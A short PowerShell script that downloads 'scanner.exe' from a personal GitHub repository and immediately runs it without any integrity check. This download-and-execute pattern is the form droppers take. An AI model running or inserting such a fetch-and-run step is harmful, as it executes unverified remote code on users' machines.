$url = "https://github.com/tpemperor/tps/raw/main/scanner.exe"
$outpath = "$PSScriptRoot/scanner.exe"
Invoke-WebRequest -Uri $url -OutFile $outpath
Start-Process -Filepath "$PSScriptRoot/scanner.exe"
